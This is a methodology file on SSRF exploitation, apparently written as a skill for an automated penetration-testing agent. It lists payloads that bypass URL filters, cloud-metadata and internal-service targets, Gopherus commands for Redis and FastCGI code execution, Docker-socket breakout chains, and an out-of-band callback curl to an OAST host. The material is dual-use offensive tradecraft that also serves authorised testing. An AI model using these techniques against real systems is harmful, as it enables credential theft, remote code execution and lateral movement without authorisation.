---
name: ssrf
description: SSRF exploitation — the attacker-chosen outbound request primitive from a server-side sink, the six controllables that decide chain reach (scheme, host, path, headers, method, body), parser and resolver differentials, cloud-metadata reachability (with IMDSv2/GCP/Azure extraction gates routed to cloud/*), DNS rebinding, redirect abuse, protocol smuggling, and the chains into cloud credential extraction, internal-service RCE, and Kubernetes lateral movement
---

# SSRF

SSRF is an **attacker-chosen outbound request** issued from a server-side network position. The primitive is defined not by "the app fetched something" but by the *controllables*: scheme, host, path, headers, method, body. Every SSRF finding names which of the six are attacker-controlled — that set decides which downstream chains are reachable. A finding that lists "yes, `?url=` is fetched" without stating what the sink accepts is not a primitive, it is a lead.

The class is built on three differentials, each of which is either the bug or the false-positive-discipline problem it is easy to mistake it for. **Parser differential**: the validator parses the URL string one way, the fetcher parses it another way, allowlists check the first while requests hit the second. **Resolve-vs-fetch differential** (TOCTOU): the validator resolves the hostname and pins an IP, the fetcher re-resolves and connects to a different IP — DNS rebinding is the canonical instance. **Scheme/header/method differential**: the sink accepts a URL but restricts the request shape (`GET` only, no custom headers), which decides whether metadata endpoints requiring `PUT` + custom headers (IMDSv2) are reachable-but-extractable or reachable-but-gated. Every technique family below is a specific expression of one of these three.

Two deep siblings extend this file — `ssrf_advanced_deep.md` (parser-differential class in depth, DNS-rebinding TOCTOU methodology, protocol smuggling, per-provider cloud-metadata extraction gates, blind-SSRF oracle channels, allowlist and WAF bypass classes, and the **canonical Busboy/Vercel multipart parser-differential block**) and `ssrf_novel_deep.md` (2024–2026 frontier: V-class parser differential with the cross-language measured matrix, Craft CMS TOCTOU DNS-rebinding to metadata, Next.js WebSocket-Upgrade SSRF, ECS-on-EC2 IMDSv2 hardening gaps, `http+unix://` and UDS reach). Both load in deep scan mode.

Scope discipline this file honors throughout: **SSRF reaches endpoints; it does not extract credentials by itself**. `169.254.169.254` reach is not IAM-role theft — IMDSv2's PUT-token, TTL header, and hop-limit are a separate gate, and the answer to "can the primitive set headers and method" decides whether reach becomes extraction. Route reachability findings here; route credential-extraction gates to `cloud/aws.md` / `cloud/gcp.md` / `cloud/azure.md`.

## The Primitive Model

Every SSRF finding is a tuple `(sink, controllables)`. The sink is the code path that emits the outbound request; the controllables are the request fields the attacker chooses. Enumerating them decides the chain.

**The six controllables**

1. **Scheme** — does the sink accept only `http`/`https`, or also `gopher`/`dict`/`ldap`/`file`/`ftp`/`http+unix`? Non-HTTP scheme reach expands protocol smuggling (Gopher → Redis/FCGI, `file:` → local read, `http+unix:` → Docker socket).
2. **Host** — literal IP forms accepted vs blocked? Hostname resolution done once or twice? Rebinding-resistant? Alternate IP encodings (decimal, hex, octal, IPv6 mapped)?
3. **Port** — implicit-by-scheme vs attacker-selectable? A port-restricted sink caps reach to `80`/`443`; a free-port sink reaches every internal service.
4. **Path** — full path controllable, or restricted to a template? Restricted paths cap OAST exfil bandwidth and constrain gopher payloads.
5. **Headers** — custom headers permitted? Cookie? Authorization? The header question decides IMDSv2 reach (needs `X-aws-ec2-metadata-token-ttl-seconds` + `X-aws-ec2-metadata-token`), GCP (`Metadata-Flavor: Google`), Azure (`Metadata: true`), Kubernetes API (`Authorization: Bearer <token>`).
6. **Method + body** — `GET`-only sinks cannot mint an IMDSv2 token; `POST`/`PUT`-capable sinks can. Body-controllable sinks reach POST-shaped internal APIs (Docker `/containers/create`, Kubernetes API create endpoints).

State the controllables set explicitly in every finding. A `?url=` proxy that permits only `GET` on `https://` schemes with no custom headers is a bounded primitive; the same sink accepting arbitrary scheme + arbitrary headers is unbounded. The two look identical at the URL parameter and different at the reach.

**Position** — where in the app is the fetch happening? Frontend-imported bundles, background jobs, cron-triggered reports, webhook callbacks, and background workers all issue requests from different network positions. Frontend proxies live in the same VPC as the app; background workers may live in a separate cluster with different egress rules and different metadata access. Enumerate every sink independently.

## Attack Surface

**Direct URL parameters**
- `url=`, `link=`, `fetch=`, `src=`, `webhook=`, `avatar=`, `image=`, `redirect=`, `next=`, `dest=`, `open_url=`

**Indirect sources**
- Open Graph / oEmbed link previews, PDF/image server-side renderers
- Server-side analytics (Referer trackers)
- Import/export jobs, calendar (ICS) fetchers
- Package/dependency resolvers (git, npm, pip, cargo, go get, terraform init)
- Repository connectors (GitHub/GitLab OAuth apps pulling manifests)
- LLM tool-use function calls that emit HTTP requests

**Protocol-translating services**
- PDF via wkhtmltopdf/Chrome headless, image pipelines (imagemagick, sharp)
- Document parsers (Office, PDF, EPUB), archive expanders
- SSO validators fetching XML/OIDC discovery documents

**Less obvious**
- GraphQL resolvers that fetch by URL
- WebSocket-upgrade proxies (see the Next.js CVE-2026-44578 class in `ssrf_novel_deep.md`)
- Background crawlers, cache warmers, sitemap generators
- Server-side email templating that fetches remote images or CSS
- App-hosted git server that clones/pulls attacker-provided remotes
- Sourcemap and monitoring beacons that follow user-supplied URLs

## Detection Channels

**OAST callback (primary)**
- `interactsh-client -v` mints a `*.oast.fun` domain; embed it in the URL parameter; watch stdout for the inbound DNS/HTTP hit
- The callback's source IP identifies the fetch position — a match with the target's egress IP confirms server-side fetch; a match with the tester's browser IP confirms client-side (**this is the finding-is-not-what-it-looks-like discipline for the class**)
- Each interactsh invocation yields a fresh domain — restart between payloads to correlate hits to a specific request

**Response reflection**
- The sink echoes fetched content into the response — a chosen `http://<oast>/marker.txt` served with a unique marker confirms reach when the marker appears in the response body
- Rarer but the highest-fidelity channel when available

**Blind, no response reflection**
- Timing differential — a reachable internal host produces a distinct response-time distribution vs an unreachable one
- TLS handshake distinguishability — a valid TLS-serving internal host handshakes; an internal HTTP-only host TLS-fails distinctively; a closed port hangs to the sink's timeout
- Cache and CDN differentials — a sink whose fetches are cached leaks a HIT/MISS via `X-Cache` or `Age` on subsequent requests
- Error-page differentials — the sink's error handling may leak fragments of the fetched response, resolver errors, or connect-refused messages

**Which channel is available decides the technique**. OAST-first when it works; timing-first when the sink is a black hole.

## Confirmation

A finding is confirmed when the oracle:

- **Comes from the expected source** — OAST hit source IP matches the target's egress, not the tester's browser
- **Correlates to the injected request** — unique nonce in the injected URL path/host reappears in the OAST callback
- **Scales with the injected parameter** — timing scales with sleep-like parameters; hit rate scales with request count
- **Survives retries** — reproducible across ≥3 attempts

A finding is **not**:

- A callback whose source IP is the tester's own machine — that is a client-side fetch, the frontend did the request
- A 500 error whose stack does not name the outbound request (could be any unrelated failure)
- A single hit that does not reproduce
- A `curl -v` against the sink from the tester's IP that fetches the OAST — that proves the sink is a proxy, not that the SSRF is exploitable in the same way from an attacker's position (headers, session, and rate limiting may differ)

## Metadata and Internal Reachability

The reach catalog for the outbound-request primitive. The finding is that the sink connects; extraction may require the header/method controllables (see `cloud/*` for the extraction gate per provider).

### Cloud-metadata endpoints — reachability only

Enumerate every provider your target may run on. Metadata-endpoint reach is a distinct primitive from IAM-role credential extraction.

| Provider | Endpoint(s) | Notes |
|---|---|---|
| AWS EC2 | `http://169.254.169.254/latest/meta-data/` (v1), `http://169.254.169.254/latest/api/token` (v2 mint) | IMDSv2 requires `PUT /latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds`, then GET with `X-aws-ec2-metadata-token`. Hop-limit default 1 (per-account default now 2 on new accounts). See `cloud/aws.md` for extraction gates. |
| AWS ECS | `http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` | Task-role credential endpoint; the URI suffix is per-task. |
| AWS ECS-on-EC2 | Falls back to EC2 IMDS depending on network mode (see `ssrf_novel_deep.md` for the ECS-on-EC2 IMDSv2 gap class) | |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | Requires `Metadata-Flavor: Google` header — a single-header gate. |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | Requires `Metadata: true` header. MSI token at `/metadata/identity/oauth2/token`. |
| Oracle Cloud (OCI) | `http://169.254.169.254/opc/v2/instance/` | v2 requires `Authorization: Bearer Oracle`; v1 (`/opc/v1/`) is deprecated but often reachable. |
| Alibaba | `http://100.100.100.200/latest/meta-data/` | Non-standard IP. No auth header by default. |
| DigitalOcean | `http://169.254.169.254/metadata/v1/` | No auth header. `user-data` often carries provisioning secrets. |
| Kubernetes | `https://kubernetes.default.svc/` | Auth typically requires `Authorization: Bearer <SA token>` from `/var/run/secrets/kubernetes.io/serviceaccount/token` — SA token needs local FS read, not just SSRF. |
| Kubelet (per-node) | `10250` (auth), `10255` (deprecated read-only) | `/pods`, `/metrics`, exec/attach endpoints per-node. |

### Internal service catalog

- **Docker daemon (unauth)**: `http://localhost:2375/v1.24/containers/json`
- **Redis**: `dict://localhost:11211/stat` (memcached shape via dict); gopher → Redis RESP on 6379 for cron/authkey/webshell writes (see `ssrf_advanced_deep.md` for protocol smuggling depth)
- **Elasticsearch / OpenSearch**: `http://localhost:9200/_cat/indices`
- **Message brokers**: RabbitMQ management UI, Kafka REST proxy, Celery/Flower dashboards
- **CI systems**: Jenkins crumb API and script console, GitLab runners
- **HashiCorp Vault**: `http://127.0.0.1:8200/v1/sys/health` and `/v1/auth/token/lookup-self` when token headers are attacker-controllable
- **FastCGI / PHP-FPM**: `gopher://localhost:9000/` for `PHP_VALUE` smuggling (see `ssrf_advanced_deep.md`)
- **Etcd**: `http://127.0.0.1:2379/v2/keys/`
- **Consul**: `http://127.0.0.1:8500/v1/kv/?recurse`
- **Prometheus / Grafana**: `http://localhost:9090/api/v1/query` and admin API
- **Framework debug endpoints**: Django `/admin/`, Flask `/console`, Spring `/actuator/*`, Rails `/rails/info/*`

Route the credential-extraction chain into `cloud/*`; route the internal-service RCE chain into `rce`; route Kubernetes lateral movement into `kubernetes`.

## Parser and Resolver Differentials

The class's canonical bug shape. When two parsers disagree on the same string, the disagreement is either exploitable or a false-positive-discipline test.

### Alternate IP forms — measured per client

Which alternate forms actually reach loopback is client-decided, not filter-decided. Measured on the sandbox (local listener on `127.0.0.1`; clients: curl 8, wget, Python `requests`/`urllib`, Node 24 `fetch`/undici, Go 1.26 `net/http`):

| Form (→127.0.0.1) | curl | wget | Python | Node | Go `net/http` |
|---|---|---|---|---|---|
| `127.1` (short) | Y | Y | Y | Y | **no** |
| `2130706433` (decimal) | Y | Y | Y | Y | **no** |
| `0x7f000001` (hex) | Y | Y | Y | Y | **no** |
| `0177.0.0.1` (octal) | Y | Y | Y | Y | **no** |
| `0` (→0.0.0.0) | Y | Y | Y | Y | **no** |
| `localhost` / `127.0.0.1` | Y | Y | Y | Y | Y |

Takeaway: curl, wget, Python, and Node route these through `getaddrinfo`, so decimal/hex/octal/`http://0` **bypass a filter that only blocks the literal `127.0.0.1`/`localhost` strings**. **Go's `net/http` is the outlier** — rejects alternate numeric forms; against a Go fetcher use a real dotted IP, a hostname, or DNS rebinding. Fingerprint the fetcher (`Server`, timing, error strings, TLS stack) and pick forms its resolver accepts. `[::1]`/`[::ffff:127.0.0.1]` reach only a service **bound to IPv6 loopback** — a miss there is a binding fact, not a parsing one; retry the IPv4 forms.

### Backslash-in-authority (V-class) — cross-language matrix

Whether the validator parser and fetcher parser diverge on `\` in the URL authority. Measured on `http://127.0.0.1\@example.com/`:

| Language | Validator parser sees | Fetcher parser connects to | Differential? |
|---|---|---|---|
| **V ≤ 0.5.2** | `net.urllib.parse()` → allowlisted host (`google.com` in the PoC) | `net.http.get()` → `127.0.0.1` | **YES** — CVE-2026-67201 |
| **Python 3.14** | `urllib.parse.urlsplit(...).hostname` → `example.com` | `urllib3.util.url.parse_url(...).host` → `127.0.0.1`; `requests` connects to `127.0.0.1` | **YES** — `urllib.parse`↔`requests` pair |
| **Python 3.14** | `urllib.parse` → `example.com` | `httpx.URL(...).host` → `example.com`; httpx connects to `example.com` | NO — both aligned |
| **Node v24** | WHATWG `new URL(...).hostname` → `127.0.0.1` | undici/global `fetch(...)` → `127.0.0.1` | NO — both aligned (WHATWG normalizes `\` to `/` in special schemes) |
| **Go 1.26** | `net/url.Parse` → `invalid userinfo` (parse error) | `net/http.Get` → same error | N/A (input rejected) |
| **Rust 1.98** | `url::Url::parse(...).host_str()` → `127.0.0.1` | `reqwest`/`hyper` → `127.0.0.1` | NO — both aligned |

The hunt lead the matrix implies: the V-class differential lives where a stdlib parser that does **not** normalize `\` (or treats it as an authority terminator) is paired with a fetcher that **does** normalize (or treats `\` as `/` per WHATWG). Python's `urllib.parse` + `urllib3`/`requests` is the confirmed unsafe pair. `httpx` uses `rfc3986` and aligns. Grep every URL-validating code path for `urllib.parse.urlsplit` / `urlparse` where the returned host is passed to an allowlist check and the URL is later fetched via `requests`; that shape is exploitable today.

Full novel-tier discussion (V-lang instance details, cross-language ecosystem posture, related parser-differential classes) lives in `ssrf_novel_deep.md`.

### Per-HTTP-client behavior

Two additional client-decided properties measured the same way (Java from documented behavior):

- **Default redirect following** — the filter checks the initial allowlisted URL, the client follows a 302 to internal: **curl does *not* follow by default** (needs `-L`); **wget, Python `requests`/`urllib`, Node `fetch`, Go `net/http` all follow by default**. Java `HttpURLConnection` follows; Java 11+ `HttpClient` does **not** (`Redirect.NEVER` default). So redirect-to-internal bypass works out of the box against most stacks but not a bare curl or the newer Java client.
- **Non-HTTP scheme support** — **curl** speaks `gopher:`, `dict:`, `file:`, `ftp:`, `ldap:`, `tftp:` — the widest reach and the one to hope for behind a curl-backed SSRF (gopher → Redis/FCGI). **wget** does HTTP(S)/FTP only. **Python `urllib`** handles `file:`/`ftp:` and `data:`. **`requests`, Node `fetch`, Go `http.Get`** are HTTP(S)-only unless a custom adapter is wired. If the sink is a curl wrapper, always test `gopher://` and `file://`.

## Filter Bypass Classes

The primary classes. Depth (WAF-specific bypasses, tokenizer-differential extensions, DNS-rebinding TOCTOU methodology, the shared Busboy multipart parser-differential class) lives in `ssrf_advanced_deep.md`.

### Address encoding

- Decimal / hex / octal representations per the client matrix above — bypass filters that string-match `127.0.0.1`/`localhost`
- IPv6 variants (`[::1]`, `[::ffff:127.0.0.1]`, expanded/collapsed forms); IPv4-mapped IPv6; mixed notation

### DNS rebinding — TOCTOU

The precondition is a **check-then-fetch gap**: the app resolves your hostname, validates the returned IP against the allowlist (passes, points at a public/attacker IP), then resolves *again* at fetch time (now returns `169.254.169.254`/`127.0.0.1`). Anything that caches the first resolution and connects to that exact IP is immune; the vulnerable pattern re-resolves.

- **Singularity of Origin** (NCC Group) is the standard framework — runs the authoritative DNS that flips the answer and the manager UI/timing to win the rebind
- **`rbndr`** (public rebinding service) alternates two fixed IPs by hostname for quick manual tests
- Set the DNS TTL to 0/1 and, for slow caches, use the multiple-A-record / flooding modes
- The reference mitigation is DNS pinning via `CURLOPT_RESOLVE` (or the equivalent in Guzzle / requests-toolbelt / undici via `lookup`); pin the resolved IP once and reuse it

Full TOCTOU methodology (winning the rebind, DNS-cache defeat, `getaddrinfo` scheduling nuance, the 2026 Craft CMS bypass class) lives in `ssrf_advanced_deep.md` and `ssrf_novel_deep.md`.

### URL confusion

- Userinfo and fragments: `http://internal@attacker/` or `http://attacker#@internal/`
- Scheme-less/relative forms the server might complete internally: `//169.254.169.254/`
- Trailing dots and mixed case: `internal.` vs `INTERNAL`, Unicode dot lookalikes
- Backslash-in-authority (V-class, above) where the validator/fetcher pair diverges

### Redirect abuse

- Allowlist only applied pre-redirect: 302 from attacker → internal host works when the fetcher follows by default (see per-client-behavior above)
- Test multi-hop and protocol switches (http → file/gopher via curl-backed sinks)

### Header and method control

- Some sinks reflect or allow CRLF-injection into the request line/headers — if arbitrary headers/methods are possible, IMDSv2, GCP metadata, Azure IMDS, and Kubernetes API become reachable-and-extractable (see `cloud/*` for the extraction gates)
- The load-bearing researcher question: **can the primitive set both the method (PUT) and a custom header?** IMDSv2 needs both; a `GET`-only sink cannot mint an IMDSv2 token even given full URL control

## Blind SSRF

- OAST-first: `interactsh-client -v` in the sandbox; embed the callback URL; watch stdout
- Timing: internal-reachable vs unreachable produces distinguishable response-time distributions; a hostname that resolves-then-connect-succeeds is faster than one that resolves-then-connect-refused which is faster than one that DNS-fails
- TLS handshake distinguishability: an HTTPS scheme against an HTTP-only internal port fails the handshake within milliseconds — a distinct timing shape from connect-refused or connect-timeout
- Port-map by binary-searching timeouts (short connect/read timeouts yield cleaner diffs)
- Response-size and status diffs on error pages when the sink includes response fragments

Full advanced blind-SSRF methodology (statistical timing, EXPLAIN-analogue oracles, cache-differential channels, DNS bit exfiltration) lives in `ssrf_advanced_deep.md`.

## Chaining

Chaining is modeled precondition/postcondition: each primitive names what capability must exist first, what capability it grants next, and the sibling skill that owns the next hop. **Chaining depth extends this file's summary — see `ssrf_advanced_deep.md`'s Chained-Primitive Exploitation for the full route catalog.**

### Upstream — what capability grants an SSRF finding

- **Recon has identified the URL-fetching sink.** `application_enumeration_api_deep` maps user-influenced URL parameters; every `?url=`/`?src=`/`?webhook=`/`?avatar=`/`?next=`/OAuth `redirect_uri`/preview-generating endpoint is a sink candidate.
- **Framework fingerprinted.** Framework detection tells you which HTTP client is behind the sink (Django `urllib3`/`requests`, Rails `net/http`, Node `fetch`/undici, Spring `RestTemplate`/`WebClient`) — the client decides which alternate IP forms and which schemes reach.
- **Authentication (usually low-privilege) reached.** Route pre-auth SSRF findings through `authentication_jwt` for post-authn persistence; an unauthenticated SSRF is rarer and more valuable.

### Downstream — capability the primitive grants

- **Internal-network reach with an attacker-chosen request** — the primary capability. Cap = the six controllables.
- **Metadata-endpoint reach** — reach only. Route the credential-extraction gate to `cloud/aws.md` (IMDSv2 PUT/hop-limit/header), `cloud/gcp.md` (`Metadata-Flavor: Google`), `cloud/azure.md` (`Metadata: true`). The gate is decided by whether the controllables include method+header.
- **Internal RCE via protocol smuggling** — gopher → Redis/FCGI → shell (see `ssrf_advanced_deep.md`); route the post-exploitation ordering to `rce`.
- **Kubernetes lateral movement** — Kubelet at 10250 with an SA token from a leaked filesystem read (chain with `path_traversal_lfi_rfi`), or Kubernetes API with an in-pod SA token; route to `kubernetes` for the pod/RBAC ordering.
- **Docker daemon control** — `http://localhost:2375/v1.24/containers/create` reachable via SSRF → container-create → host filesystem mount → break-out.
- **Cross-service auth reuse** — sinks that propagate the caller's cookies/tokens to the outbound request reach internal APIs authenticated as the caller. Route to `broken_function_level_authorization` for the resulting horizontal-vs-vertical escalation.

### Composite chains

- Recon (`application_enumeration_api_deep`) surfaces an OAuth callback with `redirect_uri=` reflected in the fetch → parser differential (V-class) via `urllib.parse`↔`requests` pair → allowlist bypass → OAST confirms reach → sink accepts custom headers → IMDSv2 token minted → IAM credential extracted (routed to `cloud/aws.md`) → S3 read of a sensitive bucket.
- OpenGraph link-preview sink → DNS rebinding via Singularity → metadata endpoint reach → GCP `Metadata-Flavor: Google` header supplied → SA token extracted → Vertex AI model call from the SA (`cloud/gcp.md` owns the extraction path).
- Webhook validator sink → gopher scheme reach (curl-backed) → Redis on 6379 → `CONFIG SET dir /var/spool/cron/` → RCE (routed to `rce`).
- WebSocket-upgrade proxy (Next.js self-hosted CVE-2026-44578, see `ssrf_novel_deep.md`) → outbound WebSocket to internal Kubernetes API → SA-token-authenticated reach to `/api/v1/pods`.

## Testing Methodology

1. **Enumerate sinks** — every user-influenced URL/host/path across web/mobile/API/webhooks/background jobs. Recon's job; if you are here without a sink list, back up.
2. **State the primitive's controllables** — for each sink, name which of {scheme, host, port, path, headers, method, body} are attacker-controlled. This is the finding's shape.
3. **Establish an oracle** — OAST-first (`interactsh-client`); timing-second; TLS-handshake-differential third; response-reflection when available.
4. **Fingerprint the fetcher** — `Server` header, timing, error strings, TLS stack — decides which alternate IP forms and which schemes reach.
5. **Fingerprint the resolver** — does the fetch resolve once or twice? Test with a short-TTL rebinder; if the second resolution wins, TOCTOU is exploitable.
6. **Test parser differentials** — backslash-in-authority (V-class), userinfo (`@`), fragment-in-authority, scheme-less relative forms, IP-form matrix; each differential is a bypass class.
7. **Test redirect following** — 302 from an allowlisted host to internal; if it follows, the allowlist is single-hop.
8. **Test header and method control** — attempt custom headers and non-GET methods; the answer decides IMDSv2/GCP/Azure metadata *extractability* (not just reach).
9. **Map protocol reach** — `gopher://`, `dict://`, `file://`, `http+unix://` — each one that connects is a distinct primitive.
10. **Enumerate the reach catalog** — metadata endpoints, Redis/Docker/kubelet/etcd/vault/rabbitmq, framework debug endpoints — every hit is a chain candidate.
11. **Chain by capability transferred** — route the next hop to the sibling skill that owns it (`cloud/*`, `rce`, `kubernetes`, `broken_function_level_authorization`, etc.).

## Validation

1. Prove a server-initiated outbound request occurred (OAST from the target's egress IP, or response-body reflection carrying an OAST-served marker)
2. Show the six-controllables set explicitly — scheme, host, port, path, headers, method, body — each marked "controllable" or "fixed"
3. For metadata-endpoint reach, name the endpoint and the gate — did the primitive supply the required header (Metadata-Flavor / Metadata / X-aws-ec2-metadata-token), and did the response show that gate was satisfied? A reach without the gate is reach only; document accordingly.
4. Where possible, demonstrate minimal-impact credential extraction (short-lived token) or a harmless internal data read — do not exfiltrate at scale, and do not chain to destructive operations without explicit auth
5. Document request parameters that control scheme/host/headers/method and redirect behavior — the reviewer must be able to reproduce the primitive and its cap
6. Where a version boundary is the finding (V-lang ≤ 0.5.2, Craft CMS ≤ 5.8.22 or ≤ 4.16.18, Next.js < 15.5.16 or < 16.2.5), state the exact affected release, verify against the saved primary source, and if possible show the fix-version behavior for contrast

## False Positives

- **OAST callback from the tester's IP** — client-side fetch, not server-side SSRF. The finding is that the browser or a frontend JS made the request, not that the backend is exploitable.
- **Strict allowlists with DNS pinning and no redirect following** — the fetch happens against the pinned IP; further redirects are not followed; the class does not apply.
- **SSRF simulators / mocks** — many test harnesses return canned responses without real egress; a callback that never arrives against a stateful sink is a mock, not a fix.
- **Blocked egress confirmed by uniform errors** — every scheme, every port, every host produces the same error class. The sink is behind an egress firewall; document but do not report as exploitable.
- **Response reflection that shows *the input URL* rather than *the fetched content*** — an app that echoes the URL back is not proving a fetch happened; only content from the URL proves it.
- **Metadata-endpoint reach without the header/method to extract** — reach ≠ credential extraction. Report as reachability; do not claim credential compromise without proof.
- **Alternate IP forms against Go fetchers** — per the measured client matrix, Go's `net/http` rejects `127.1`/`0x7f000001`/`2130706433`/`0177.0.0.1`/`0`; a payload that "works in curl" is not a Go-target finding.

## Impact

- Cloud credential disclosure (route extraction gate to `cloud/*`) with subsequent control-plane/API access
- Access to internal control panels, dashboards, secret stores not exposed publicly
- Lateral movement into Kubernetes clusters (kubelet, API server), service meshes, CI/CD
- RCE via protocol abuse (gopher → Redis/FCGI, Docker daemon control) — routed to `rce`
- Data exfiltration from internal storage (etcd, vault, S3 via role, RDS via VPC reach)
- Persistence via reachable admin endpoints (Jenkins script console, Grafana admin, Consul KV writes)

## Tooling

- **interactsh-client** — the OAST callback for confirmation and blind exfil. `interactsh-client -v` in the sandbox emits a unique domain and prints inbound DNS/HTTP hits.
  ```bash
  interactsh-client -v -o interactsh.log &
  # then in another shell:
  curl 'https://target/api/preview?url=http://<id>.oast.fun/probe'
  tail -f interactsh.log
  ```
- **Gopherus** — RESP/FastCGI payload generator for protocol smuggling via SSRF. See `ssrf_advanced_deep.md` for the smuggling technique catalog.
  ```bash
  gopherus --exploit redis        # emits gopher://.../ RESP for cron/webshell
  gopherus --exploit fastcgi      # emits gopher://.../ FCGI record for PHP-FPM
  ```
- **Singularity of Origin** — DNS-rebinding framework. Runs the authoritative DNS, times the flip, provides a manager UI to correlate.
- **rbndr** — public two-IP rebinder for quick manual tests: `curl 'http://<publicIP>.<internalIP>.rbndr.us/'` alternates by lookup.
- **SSRFmap** — SSRF-specific fuzzer with per-primitive modules (metadata, Redis, gopher).
- **agent-proxy / mitmproxy** — inspect the fetcher's actual request from the sink; compare to what the validator was told. Where the two diverge, the parser differential is visible.

## Pro Tips

1. State the six controllables before firing anything. Findings without a stated controllables set are leads, not primitives.
2. OAST-first, timing-second, TLS-handshake-differential third. Any two of the three corroborates a real reach.
3. Fingerprint the fetcher before choosing alternate IP forms. The measured client matrix decides which forms reach — a payload tuned for curl silently fails against Go.
4. The question that decides IMDSv2 extractability is "can the primitive set headers and method." Do not skip it. A `GET`-only sink cannot extract from IMDSv2.
5. On a modern Node target with WHATWG-URL and undici, the V-class differential is not present in the standard libraries. Do not chase it; test other differentials.
6. On a Python target grepping for URL validation, look specifically for `urllib.parse.urlsplit` / `urlparse` whose returned host is passed to an allowlist *and* the URL is later fetched via `requests`/`urllib3`. That shape is the exploitable V-class pair today.
7. Redirect-follow default matters. curl doesn't follow; wget/Python/Node/Go do. The bypass class is off-by-default against a curl-wrapper sink.
8. Gopher is the widest-reach non-HTTP scheme; if the sink is curl-backed, always test it. It is the primary path to Redis/FCGI RCE from an SSRF.
9. For any metadata-endpoint reach finding, name the extraction gate explicitly, and route the credential-extraction step to the appropriate `cloud/*` skill. Do not conflate reach with extraction.
10. Rebinding wins against sinks that re-resolve at fetch time; fails against sinks that resolve once. The distinction is which library did the fetch (Guzzle re-resolves on each request; a `curl_multi` with `CURLOPT_RESOLVE` does not).
11. When the target is a WebSocket-upgrade proxy (see `ssrf_novel_deep.md`'s Next.js class), the SSRF fires on the upgrade handshake, not on subsequent frames. Treat the upgrade-request URL as the primitive's URL.
12. On modern Kubernetes stacks, IMDSv2 hop-limit interacts with the CNI. `awsvpc` and `host` network modes reach IMDS regardless of a hop-limit intended to block containers (see `ssrf_novel_deep.md`'s ECS-on-EC2 hardening-gap class).
13. Every finding names the position: which sink, which network zone, which egress. A finding without position is not chainable — the reviewer cannot decide what the reach reaches.

## Summary

SSRF is an attacker-chosen outbound request from a server-side network position. Every finding is a tuple `(sink, controllables)`; the controllables set — scheme, host, port, path, headers, method, body — decides the chain. The class is built on three differentials (parser, resolve-vs-fetch, scheme/header/method); every technique family is an expression of one. Reach is not extraction — metadata endpoints require gate satisfaction routed to `cloud/*`, and RCE via protocol smuggling routed to `rce`. Fingerprint the fetcher, state the primitive, establish an oracle, name the extraction gate. The advanced sibling `ssrf_advanced_deep.md` owns parser-differential depth, TOCTOU methodology, protocol smuggling, and the canonical Busboy multipart parser-differential block reusable across `xss`/`rce`/`sql_injection`/`ssrf`; the novel sibling `ssrf_novel_deep.md` owns the 2024–2026 frontier with the V-class measured matrix, Craft CMS TOCTOU, Next.js WebSocket SSRF, and ECS-on-EC2 IMDSv2 hardening gaps.
